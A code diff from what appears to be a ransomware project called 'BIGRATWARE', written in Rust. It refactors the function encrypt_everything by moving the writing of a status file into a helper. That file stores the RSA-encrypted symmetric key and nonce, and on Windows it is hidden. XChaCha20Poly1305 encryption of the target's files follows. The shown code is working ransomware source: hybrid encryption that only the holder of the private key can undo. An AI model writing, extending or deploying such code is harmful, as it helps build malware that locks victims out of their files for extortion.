@@ -129,24 +129,11 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
     let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
         .with_context(|| "Failed to encrypt the nonce")?;
 
-    let err_context = || "Failed to create a status file";
-    #[cfg(not(windows))]
-        let mut status_file = OpenOptions::new()
-        .write(true)
-        .create(true)
-        .open(path.join(".bigrat-status"))
-        .with_context(err_context)?;
-    #[cfg(windows)]
-        let mut status_file = OpenOptions::new()
-        .write(true)
-        .create(true)
-        .attributes(0x2)  // hidden file
-        .open(path.join(".bigrat-status"))
-        .with_context(err_context)?;
-    status_file.write_all(BIGRAT_PNG).with_context(err_context)?;
-    status_file.write_all(&encrypted_key).with_context(err_context)?;
-    status_file.write_all(&encrypted_nonce).with_context(err_context)?;
-    status_file.write_all(b"BIGRATWARE_STATUS=started;").with_context(err_context)?;
+    let mut status_file = create_status_file(
+        path,
+        &encrypted_key,
+        &encrypted_nonce,
+    )?;
 
     let aead = XChaCha20Poly1305::new(key.as_ref().into());
 
@@ -156,4 +143,32 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
         .with_context(|| "Failed to write to a status file")?;
 
     Ok(())
+}
+
+fn create_status_file(
+    path: &Path,
+    encrypted_key: &[u8],
+    encrypted_nonce: &[u8],
+) -> Result<File> {
+    let err_context = || "Failed to create a status file";
+    #[cfg(not(windows))]
+    let mut status_file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .open(path.join(".bigrat-status"))
+        .with_context(err_context)?;
+    #[cfg(windows)]
+    let mut status_file = OpenOptions::new()
+        .write(true)
+        .create(true)
+        .attributes(0x2)  // hidden file
+        .open(path.join(".bigrat-status"))
+        .with_context(err_context)?;
+    status_file.write_all(BIGRAT_PNG).with_context(err_context)?;
+    status_file.write_all(encrypted_key).with_context(err_context)?;
+    status_file.write_all(encrypted_nonce).with_context(err_context)?;
+
+    status_file.write_all(b"BIGRATWARE_STATUS=started;").with_context(err_context)?;
+
+    Ok(status_file)
 }
